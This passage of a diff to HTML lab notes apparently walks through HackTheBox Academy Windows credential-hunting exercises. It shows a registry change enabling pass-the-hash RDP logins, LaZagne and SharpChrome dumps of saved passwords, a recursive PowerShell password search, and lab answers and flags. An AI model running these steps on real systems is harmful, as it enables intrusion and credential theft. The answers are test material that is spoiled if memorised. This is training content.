+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-129-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1"></a>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+</span></code></pre></div></td></tr></table></div>
+<p>And now we can connect via RDP and the NTLM hash:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-130-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1"></a>xfreerdp /v:10.129.23.186 /u:Administrator /pth:7796ee39fd3a9c3a1844556115ae1a54 /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Which user has credentials stored for RDP access to the WEB01 host?</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-131-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1"></a>xfreerdp /v:10.129.170.75 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>Open powershell and go to c:\Tools</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-132-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1"></a>.\lazagne.exe all
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-133-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-133-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-133-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-133-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-133-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-133-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-133-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-133-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-133-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-133-10">10</a></span>
+<span class="normal"><a href="#__codelineno-133-11">11</a></span>
+<span class="normal"><a href="#__codelineno-133-12">12</a></span>
+<span class="normal"><a href="#__codelineno-133-13">13</a></span>
+<span class="normal"><a href="#__codelineno-133-14">14</a></span>
+<span class="normal"><a href="#__codelineno-133-15">15</a></span>
+<span class="normal"><a href="#__codelineno-133-16">16</a></span>
+<span class="normal"><a href="#__codelineno-133-17">17</a></span>
+<span class="normal"><a href="#__codelineno-133-18">18</a></span>
+<span class="normal"><a href="#__codelineno-133-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1"></a>########## User: htb-student ##########
+</span><span id="__span-133-2"><a id="__codelineno-133-2" name="__codelineno-133-2"></a>
+</span><span id="__span-133-3"><a id="__codelineno-133-3" name="__codelineno-133-3"></a>------------------- Winscp passwords -----------------
+</span><span id="__span-133-4"><a id="__codelineno-133-4" name="__codelineno-133-4"></a>
+</span><span id="__span-133-5"><a id="__codelineno-133-5" name="__codelineno-133-5"></a>[+] Password found !!!
+</span><span id="__span-133-6"><a id="__codelineno-133-6" name="__codelineno-133-6"></a>URL: ftp.ilfreight.local
+</span><span id="__span-133-7"><a id="__codelineno-133-7" name="__codelineno-133-7"></a>Login: root
+</span><span id="__span-133-8"><a id="__codelineno-133-8" name="__codelineno-133-8"></a>Password: Ftpuser!
+</span><span id="__span-133-9"><a id="__codelineno-133-9" name="__codelineno-133-9"></a>Port: 22
+</span><span id="__span-133-10"><a id="__codelineno-133-10" name="__codelineno-133-10"></a>
+</span><span id="__span-133-11"><a id="__codelineno-133-11" name="__codelineno-133-11"></a>------------------- Vault passwords -----------------
+</span><span id="__span-133-12"><a id="__codelineno-133-12" name="__codelineno-133-12"></a>
+</span><span id="__span-133-13"><a id="__codelineno-133-13" name="__codelineno-133-13"></a>[-] Password not found !!!
+</span><span id="__span-133-14"><a id="__codelineno-133-14" name="__codelineno-133-14"></a>URL: Domain:target=WEB01
+</span><span id="__span-133-15"><a id="__codelineno-133-15" name="__codelineno-133-15"></a>Login: amanda
+</span><span id="__span-133-16"><a id="__codelineno-133-16" name="__codelineno-133-16"></a>
+</span><span id="__span-133-17"><a id="__codelineno-133-17" name="__codelineno-133-17"></a>
+</span><span id="__span-133-18"><a id="__codelineno-133-18" name="__codelineno-133-18"></a>[+] 1 passwords have been found.
+</span><span id="__span-133-19"><a id="__codelineno-133-19" name="__codelineno-133-19"></a>For more information launch it again with the -v option
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: amanda</p>
+<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!".  Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-134-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1"></a>xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>Open Powershell and go to c:\Tools:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-135-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1"></a>.\SharpChrome.exe logins /unprotect
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-136-1">1</a></span>
+<span class="normal"><a href="#__codelineno-136-2">2</a></span>
+<span class="normal"><a href="#__codelineno-136-3">3</a></span>
+<span class="normal"><a href="#__codelineno-136-4">4</a></span>
+<span class="normal"><a href="#__codelineno-136-5">5</a></span>
+<span class="normal"><a href="#__codelineno-136-6">6</a></span>
+<span class="normal"><a href="#__codelineno-136-7">7</a></span>
+<span class="normal"><a href="#__codelineno-136-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1"></a>[X] Error : 0
+</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2"></a>
+</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3"></a>---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---
+</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4"></a>
+</span><span id="__span-136-5"><a id="__codelineno-136-5" name="__codelineno-136-5"></a>file_path,signon_realm,origin_url,date_created,times_used,username,password
+</span><span id="__span-136-6"><a id="__codelineno-136-6" name="__codelineno-136-6"></a>C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,&quot;?U?1`?l}?????A
+</span><span id="__span-136-7"><a id="__codelineno-136-7" name="__codelineno-136-7"></a>?&quot;
+</span><span id="__span-136-8"><a id="__codelineno-136-8" name="__codelineno-136-8"></a>C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http://vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: ILVCadm1n1qazZAQ!</p>
+<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Enumerate the host and find the password for ftp.ilfreight.local</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-137-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1"></a>xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>Open powershell and go to c:\Tools</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-138-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1"></a>.\lazagne.exe all
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-139-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-139-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-139-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-139-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-139-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-139-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-139-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-139-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-139-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-139-10">10</a></span>
+<span class="normal"><a href="#__codelineno-139-11">11</a></span>
+<span class="normal"><a href="#__codelineno-139-12">12</a></span>
+<span class="normal"><a href="#__codelineno-139-13">13</a></span>
+<span class="normal"><a href="#__codelineno-139-14">14</a></span>
+<span class="normal"><a href="#__codelineno-139-15">15</a></span>
+<span class="normal"><a href="#__codelineno-139-16">16</a></span>
+<span class="normal"><a href="#__codelineno-139-17">17</a></span>
+<span class="normal"><a href="#__codelineno-139-18">18</a></span>
+<span class="normal"><a href="#__codelineno-139-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1"></a>########## User: htb-student ##########
+</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2"></a>
+</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3"></a>------------------- Winscp passwords -----------------
+</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4"></a>
+</span><span id="__span-139-5"><a id="__codelineno-139-5" name="__codelineno-139-5"></a>[+] Password found !!!
+</span><span id="__span-139-6"><a id="__codelineno-139-6" name="__codelineno-139-6"></a>URL: ftp.ilfreight.local
+</span><span id="__span-139-7"><a id="__codelineno-139-7" name="__codelineno-139-7"></a>Login: root
+</span><span id="__span-139-8"><a id="__codelineno-139-8" name="__codelineno-139-8"></a>Password: Ftpuser!
+</span><span id="__span-139-9"><a id="__codelineno-139-9" name="__codelineno-139-9"></a>Port: 22
+</span><span id="__span-139-10"><a id="__codelineno-139-10" name="__codelineno-139-10"></a>
+</span><span id="__span-139-11"><a id="__codelineno-139-11" name="__codelineno-139-11"></a>------------------- Vault passwords -----------------
+</span><span id="__span-139-12"><a id="__codelineno-139-12" name="__codelineno-139-12"></a>
+</span><span id="__span-139-13"><a id="__codelineno-139-13" name="__codelineno-139-13"></a>[-] Password not found !!!
+</span><span id="__span-139-14"><a id="__codelineno-139-14" name="__codelineno-139-14"></a>URL: Domain:target=WEB01
+</span><span id="__span-139-15"><a id="__codelineno-139-15" name="__codelineno-139-15"></a>Login: amanda
+</span><span id="__span-139-16"><a id="__codelineno-139-16" name="__codelineno-139-16"></a>
+</span><span id="__span-139-17"><a id="__codelineno-139-17" name="__codelineno-139-17"></a>
+</span><span id="__span-139-18"><a id="__codelineno-139-18" name="__codelineno-139-18"></a>[+] 1 passwords have been found.
+</span><span id="__span-139-19"><a id="__codelineno-139-19" name="__codelineno-139-19"></a>For more information launch it again with the -v option
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: Ftpuser!</p>
+<p>Other creds in the system:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-140-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-140-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-140-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-140-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-140-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-140-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-140-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-140-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-140-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-140-10">10</a></span>
+<span class="normal"><a href="#__codelineno-140-11">11</a></span>
+<span class="normal"><a href="#__codelineno-140-12">12</a></span>
+<span class="normal"><a href="#__codelineno-140-13">13</a></span>
+<span class="normal"><a href="#__codelineno-140-14">14</a></span>
+<span class="normal"><a href="#__codelineno-140-15">15</a></span>
+<span class="normal"><a href="#__codelineno-140-16">16</a></span>
+<span class="normal"><a href="#__codelineno-140-17">17</a></span>
+<span class="normal"><a href="#__codelineno-140-18">18</a></span>
+<span class="normal"><a href="#__codelineno-140-19">19</a></span>
+<span class="normal"><a href="#__codelineno-140-20">20</a></span>
+<span class="normal"><a href="#__codelineno-140-21">21</a></span>
+<span class="normal"><a href="#__codelineno-140-22">22</a></span>
+<span class="normal"><a href="#__codelineno-140-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1"></a># Located at c:\Department Shares\IT\cred.txt
+</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2"></a>NIX01 admin
+</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3"></a>root:n1X_p0wer_us3er!
+</span><span id="__span-140-4"><a id="__codelineno-140-4" name="__codelineno-140-4"></a>
+</span><span id="__span-140-5"><a id="__codelineno-140-5" name="__codelineno-140-5"></a># Located at c:\TakeOwn
+</span><span id="__span-140-6"><a id="__codelineno-140-6" name="__codelineno-140-6"></a>1m_th3_f1l3_0wn3r_n0W!
+</span><span id="__span-140-7"><a id="__codelineno-140-7" name="__codelineno-140-7"></a>
+</span><span id="__span-140-8"><a id="__codelineno-140-8" name="__codelineno-140-8"></a># Running all modules of lazagne.exe with
+</span><span id="__span-140-9"><a id="__codelineno-140-9" name="__codelineno-140-9"></a>.\lazagne.exe all
+</span><span id="__span-140-10"><a id="__codelineno-140-10" name="__codelineno-140-10"></a>---------------- Winscp passwords -----------------
+</span><span id="__span-140-11"><a id="__codelineno-140-11" name="__codelineno-140-11"></a>
+</span><span id="__span-140-12"><a id="__codelineno-140-12" name="__codelineno-140-12"></a>[+] Password found !!!
+</span><span id="__span-140-13"><a id="__codelineno-140-13" name="__codelineno-140-13"></a>URL: transfer.inlanefreight.local
+</span><span id="__span-140-14"><a id="__codelineno-140-14" name="__codelineno-140-14"></a>Login: root
+</span><span id="__span-140-15"><a id="__codelineno-140-15" name="__codelineno-140-15"></a>Password: Summer2020!
+</span><span id="__span-140-16"><a id="__codelineno-140-16" name="__codelineno-140-16"></a>Port: 22
+</span><span id="__span-140-17"><a id="__codelineno-140-17" name="__codelineno-140-17"></a>
+</span><span id="__span-140-18"><a id="__codelineno-140-18" name="__codelineno-140-18"></a># Under C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
+</span><span id="__span-140-19"><a id="__codelineno-140-19" name="__codelineno-140-19"></a>F3ar_th3_p0tato!
+</span><span id="__span-140-20"><a id="__codelineno-140-20" name="__codelineno-140-20"></a>
+</span><span id="__span-140-21"><a id="__codelineno-140-21" name="__codelineno-140-21"></a># By dumping files with password
+</span><span id="__span-140-22"><a id="__codelineno-140-22" name="__codelineno-140-22"></a>Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;password|pwd|pass&quot;
+</span><span id="__span-140-23"><a id="__codelineno-140-23" name="__codelineno-140-23"></a># We obtained: username=&quot;tomcat&quot; password=&quot;s3cret&quot;
+</span></code></pre></div></td></tr></table></div>
+<h2 id="restricted-environments">Restricted Environments</h2>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 13, 2025 19:25:48"><span class="timeago" datetime="2025-04-13T19:25:48+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 13, 2025 19:25:48">2025-04-13</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 14, 2025 19:20:13"><span class="timeago" datetime="2025-04-14T19:20:13+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 14, 2025 19:20:13">2025-04-14</span></small></br>
 
 
     <small>Created: February 23, 2025 21:12:05</small>
